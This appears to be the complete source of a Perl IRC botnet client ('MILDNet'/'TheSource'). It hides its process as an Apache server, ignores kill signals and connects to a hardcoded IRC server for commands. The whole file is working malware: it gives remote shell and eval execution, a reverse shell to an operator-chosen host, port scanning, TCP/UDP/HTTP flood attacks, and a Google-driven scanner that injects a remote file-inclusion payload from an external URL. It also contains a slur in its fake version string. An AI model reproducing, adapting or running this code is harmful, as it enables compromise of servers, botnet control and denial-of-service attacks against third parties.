#!/usr/bin/perl

use HTTP::Request;

use LWP::UserAgent;


my $processo = '/usr/local/apache/bin/httpd -DSSL';

if (`ps uxw` =~ /root/)
{
exit;
}


#CONFIGURATION

my $linas_max='8';

my $sleep='5';

my @cmdstring='http://www.allcorsa.co.uk/forums/photoplog/images/5/small/bat.jpg/rhe.ganteng?';

my @adms=("TheSource");

my @canais=("#TheSource");

my @nickname = ("ID");


my $nick = $nickname[rand scalar @nickname];

my $ircname = $nickname[rand scalar @nickname];


chop (my $realname = 'Powered by MILDNet!.');

$servidor='66.252.28.191' unless $servidor;

my $porta='6665';

my $VERSAO = '11,1V10TheSource';

$SIG{'INT'} = 'IGNORE';

$SIG{'HUP'} = 'IGNORE';

$SIG{'TERM'} = 'IGNORE';

$SIG{'CHLD'} = 'IGNORE';

$SIG{'PS'} = 'IGNORE';

use IO::Socket;

use Socket;

use IO::Select;

chdir("/");

$servidor="$ARGV[0]" if $ARGV[0];

$0="$processo"."\0"x16;;

my $pid=fork;

exit if $pid;

die "Masalah fork: $!" unless defined($pid);




our %irc_servers;

our %DCC;

my $dcc_sel = new IO::Select->new();


$sel_cliente = IO::Select->new();

sub sendraw {

  if ($#_ == '1') {

    my $socket = $_[0];

    print $socket "$_[1]\n";

  } else {

      print $IRC_cur_socket "$_[0]\n";

  }

}



sub conectar {

   my $meunick = $_[0];

   my $servidor_con = $_[1];

   my $porta_con = $_[2];


   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
 PeerPort=>$porta_con) or return(1);

   if (defined($IRC_socket)) {

     $IRC_cur_socket = $IRC_socket;


     $IRC_socket->autoflush(1);

     $sel_cliente->add($IRC_socket);


     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";

     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";

     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;

     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;

     nick("$meunick");

     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");

     sleep 1;

   }

}

my $line_temp;

while( 1 ) {

   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }

   delete($irc_servers{''}) if (defined($irc_servers{''}));

   my @ready = $sel_cliente->can_read(0);

   next unless(@ready);

   foreach $fh (@ready) {

     $IRC_cur_socket = $fh;

     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};

     $nread = sysread($fh, $msg, 4096);

     if ($nread == 0) {

        $sel_cliente->remove($fh);

        $fh->close;

        delete($irc_servers{$fh});

     }

     @lines = split (/\n/, $msg);



     for(my $c=0; $c<= $#lines; $c++) {

       $line = $lines[$c];

       $line=$line_temp.$line if ($line_temp);

       $line_temp='';

       $line =~ s/\r$//;

       unless ($c == $#lines) {

         parse("$line");

       } else {

           if ($#lines == 0) {

             parse("$line");

           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");

           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {

               parse("$line"); 
	   } else {

	               $line_temp = $line;

           }

       }

      }

   }

}



sub parse {

   my $servarg = shift;

   if ($servarg =~ /^PING \:(.*)/) {

     sendraw("PONG :$1");

   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {

       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;

       if ($args =~ /^\001VERSION\001$/) {

       	 notice("$pn", "\001mIRC v6.17 Khaled Mardam-GAY\001");

          }

       if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {

         if ($onde eq "$meunick"){

           shell("$pn", "$args");

         }

         if ($args =~ /^(\Q$meunick\E|\!ok)\s+(.*)/ ) {

            my $natrix = $1;

            my $arg = $2;

            if ($arg =~ /^\!(.*)/) {

              ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);

            } elsif ($arg =~ /^\@(.*)/) {

                $ondep = $onde;

                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");

            } else {

                shell("$onde", "$arg");

            }

         }

       }

}

    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {

       if (lc($1) eq lc($meunick)) {

         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;

       }

   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {

       nick("$meunick|".int rand(999999));

   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {

       $meunick = $2;

       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;

       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";

       foreach my $canal (@canais) {

         sendraw("JOIN $canal ddosit");

       }

   }

}




sub bfunc {

  my $printl = $_[0];

  my $funcarg = $_[1];

  if (my $pid = fork) {

     waitpid($pid, 0);

  } else {

      if (fork) {

         exit;

       } else {

           if ($funcarg =~ /^portscan (.*)/) {

             my $hostip="$1";

             my


@portas=("21","22","23","25","80","113","135","445","1025","5000","6660","6661","6662","6663","6665","
6666","6667","6668","6669","7000","8080","8018");

             my (@aberta, %porta_banner);

     sendraw($IRC_cur_socket, "PRIVMSG $printl :12[9Scan12] Scanning ".$1." untuk ports yang terbuka.");

             foreach my $porta (@portas)  {

                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>

'tcp', Timeout => 4);

                if ($scansock) {

                   push (@aberta, $porta);

                   $scansock->close;

                }

             }


             if (@aberta) {

               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[9Scan12] Port Yang Terbuka: @aberta");

             } else {

               sendraw($IRC_cur_socket,"PRIVMSG $printl :12[9Scan12] No open ports found");

             }

           }

           if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {


     sendraw($IRC_cur_socket, "PRIVMSG $printl :12[9TCP DDoSing12] Attacking ".$1.":".$2." for ".$3." detik.");

     my $itime = time;

     my ($cur_time);

             $cur_time = time - $itime;

     while ($3>$cur_time){

             $cur_time = time - $itime;

     &tcpflooder("$1","$2","$3");

             }

     sendraw($IRC_cur_socket, "PRIVMSG $printl :PRIVMSG $printl :12[9TCP DDoSing12] Attack done ".$1.":".$2.".");

           }

   if ($funcarg =~ /^version/) {

sendraw($IRC_cur_socket, "PRIVMSG $printl :14(12V9E3R5S7I13O15N14) 8Is ".$VERSAO);

}


if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {

my $host = "$1";

my $porta = "$2";

my $proto = getprotobyname('tcp');

my $iaddr = inet_aton($host);

my $paddr = sockaddr_in($porta, $iaddr);

my $shell = "/bin/sh -i";

if ($^O eq "MSWin32") {

$shell = "cmd.exe";

}

socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";

connect(SOCKET, $paddr) or die "connect: $!";

open(STDIN, ">&SOCKET");

open(STDOUT, ">&SOCKET");

open(STDERR, ">&SOCKET");

system("$shell");

close(STDIN);

close(STDOUT);

close(STDERR);


if ($estatisticas)

{

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[9BackConnect12]: Connecting to $host:$porta");

}

}


#SCANNER

           if ($funcarg =~ /^scan\s+(\d+)\s+(.*)\s+(.*)/) {

            @gstring = $3;

             $boturl=$2;

   sendraw($IRC_cur_socket, "PRIVMSG $printl :Scanning".$3." on ".$boturl." time ".$1." second");

     srand;

     my $itime = time;

     my ($cur_time);

     my ($exploited);

             $boturl=$2;

             $cur_time = time - $itime;$exploited = 0;

while($1>$cur_time){

    $cur_time = time - $itime;

    @urls=fetch();

foreach $url (@urls) {

$cur_time = time - $itime;

sendraw($IRC_cur_socket, "PRIVMSG #debug :15(7@2Scan15) 15(2Exploiting7:12 ".$url2." 15)");
my $path = "";my $file = "";($path, $file) = $url =~ /^(.+)\/(.+)$/;

$url2 ="http://".$path."/".$boturl."@cmdstring?";


print "\n".$url2."\n\n";





my $req=HTTP::Request->new(GET=>$url2);

my $ua=LWP::UserAgent->new();

$ua->timeout(10);

my $response=$ua->request($req);


if ($response->is_success) {

 if( $response->content =~ /By/ && $response->content =~ /rhe/ ){

 sendraw($IRC_cur_socket, "PRIVMSG $printl :(FOUND)".$url2."\n\n");

}

}

else {
}

 }

}

     sendraw($IRC_cur_socket, "PRIVMSG $printl :Finish on ".$1." second.");

           }

           if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {

     sendraw($IRC_cur_socket, "PRIVMSG $printl :12[9HTTP DDoSing12] Attacking ".$1.":80 for ".$2." detik.");

     my $itime = time;

     my ($cur_time);

             $cur_time = time - $itime;

     while ($2>$cur_time){

             $cur_time = time - $itime;

     my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);

             print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";

     close($socket);

             }

     sendraw($IRC_cur_socket, "PRIVMSG $printl :12[9HTTP DDoSing12] Attacking done ".$1.".");

           }

           if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {

             sendraw($IRC_cur_socket, "PRIVMSG $printl :12[9UDP DDoSing12] Attacking ".$1." with ".$2." Kb packets for ".$3." detik.");

             my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");

             $dtime = 1 if $dtime == 0;

             my %bytes;

             $bytes{igmp} = $2 * $pacotes{igmp};

             $bytes{icmp} = $2 * $pacotes{icmp};

             $bytes{o} = $2 * $pacotes{o};

             $bytes{udp} = $2 * $pacotes{udp};

             $bytes{tcp} = $2 * $pacotes{tcp};

             sendraw($IRC_cur_socket, "PRIVMSG $printl :12[9UDP DDoSing12] Sent ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in ".$dtime." detik to ".$1.".");

           }

           exit;

       }

  }

}



sub ircase {

  my ($kem, $printl, $case) = @_;


  if ($case =~ /^join (.*)/) {

     j("$1");

   }

   if ($case =~ /^part (.*)/) {

      p("$1");

   }

   if ($case =~ /^rejoin\s+(.*)/) {

      my $chan = $1;

      if ($chan =~ /^(\d+) (.*)/) {

        for (my $ca = 1; $ca <= $1; $ca++ ) {

          p("$2");

          j("$2");

        }

      }
 else {

          p("$chan");

          j("$chan");

      }

   }

   if ($case =~ /^op/) {

      op("$printl", "$kem") if $case eq "op";

      my $oarg = substr($case, 3);

      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);

   }

   if ($case =~ /^deop/) {

      deop("$printl", "$kem") if $case eq "deop";

      my $oarg = substr($case, 5);

      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);

   }

   if ($case =~ /^msg\s+(\S+) (.*)/) {

      msg("$1", "$2");

   }

   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {

      for (my $cf = 1; $cf <= $1; $cf++) {

        msg("$2", "$3");

      }

   }

   if ($case =~ /^ctcp\s+(\S+) (.*)/) {

      ctcp("$1", "$2");

   }

   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {

      for (my $cf = 1; $cf <= $1; $cf++) {

        ctcp("$2", "$3");

      }

   }

   if ($case =~ /^nick (.*)/) {

      nick("$1");

   }

   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {

       conectar("$2", "$1", 6667);

   }

   if ($case =~ /^raw (.*)/) {

      sendraw("$1");

   }

   if ($case =~ /^eval (.*)/) {

     eval "$1";

   }

}


sub shell {

  my $printl=$_[0];

  my $comando=$_[1];

  if ($comando =~ /cd (.*)/) {

    chdir("$1") || msg("$printl", "No such file or directory");

    return;

  }

  elsif ($pid = fork) {

     waitpid($pid, 0);

  }
 else {

      if (fork) {

         exit;

       } else {

           my @resp=`$comando 2>&1 3>&1`;

           my $c=0;

           foreach my $linha (@resp) {

             $c++;

             chop $linha;

             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");

             if ($c == "$linas_max") {

               $c=0;

               sleep $sleep;

             }

           }

           exit;

       }

  }

}



sub tcpflooder {

 my $itime = time;

 my ($cur_time);

 my ($ia,$pa,$proto,$j,$l,$t);

 $ia=inet_aton($_[0]);

 $pa=sockaddr_in($_[1],$ia);

 $ftime=$_[2];

 $proto=getprotobyname('tcp');

 $j=0;$l=0;

 $cur_time = time - $itime;

 while ($l<1000){

  $cur_time = time - $itime;

  last if $cur_time >= $ftime;

  $t="SOCK$l";

  socket($t,PF_INET,SOCK_STREAM,$proto);

  connect($t,$pa)||$j--;

  $j++;$l++;

 }

 $l=0;

 while ($l<1000){

  $cur_time = time - $itime;

  last if $cur_time >= $ftime;

  $t="SOCK$l";

  shutdown($t,2);

  $l++;

 }

}



sub udpflooder {

  my $iaddr = inet_aton($_[0]);

  my $msg = 'A' x $_[1];

  my $ftime = $_[2];

  my $cp = 0;

  my (%pacotes);

  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;



  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;


  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;

  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;

  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;

  return(undef) if $cp == 4;

  my $itime = time;

  my ($cur_time);

  while ( 1 ) {

     for (my $porta = 1;
 $porta <= 65000; $porta++) {

       $cur_time = time - $itime;

       last if $cur_time >= $ftime;

       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;

       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;

       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;

       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


       for (my $pc = 3;
 $pc <= 255;$pc++) {

         next if $pc == 6;

         $cur_time = time - $itime;

         last if $cur_time >= $ftime;

         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;

         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;

       }

 }

     last if $cur_time >= $ftime;

  }

  return($cur_time, %pacotes);

}



sub ctcp {

   return unless $#_ == 1;

   sendraw("PRIVMSG $_[0] :\001$_[1]\001");

}

sub msg {

   return unless $#_ == 1;

   sendraw("PRIVMSG $_[0] :$_[1]");

}

sub notice {

   return unless $#_ == 1;

   sendraw("NOTICE $_[0] :$_[1]");

}

sub op {

   return unless $#_ == 1;

   sendraw("MODE $_[0] +o $_[1]");

}

sub deop {

   return unless $#_ == 1;

   sendraw("MODE $_[0] -o $_[1]");

}

sub j {
 &join(@_);
 }

sub join {

   return unless $#_ == 0;

   sendraw("JOIN $_[0]");

}

sub p { part(@_);
 }

sub part {

  sendraw("PART $_[0]");

}

sub nick {

  return unless $#_ == 0;

  sendraw("NICK $_[0]");

}

sub quit {

  sendraw("QUIT :$_[0]");

}

sub fetch(){
    my $rnd=(int(rand(9999)));
    my $n= 80;
    if ($rnd<5000) { $n<<=1;}
    my $s= (int(rand(10)) * $n);
{
my @dominios = ("removed-them-all");
my @str;
foreach $dom  (@dominios)
{
   push (@str,"@gstring");
}
    my $query="www.google.com/search?q=";
    $query.=$str[(rand(scalar(@str)))];
    $query.="&num=$n&start=$s";
    my @lst=();
    sendraw("privmsg #debug :DEBUG only test googling: ".$query."");
    my $page = http_query($query);
    while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"? class=l>/g){
if ($1 !~ m/google|cache|translate/){
    push (@lst,$1);
}
    }
    return (@lst);
}
sub http_query($){
    my ($url) = @_;
    my $host=$url;
    my $query=$url;
    my $page="";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~s/$host//;
    if ($query eq "") {$query="/";};
    eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
    };
   return $page;
}
}

#Powered By MILDNet#
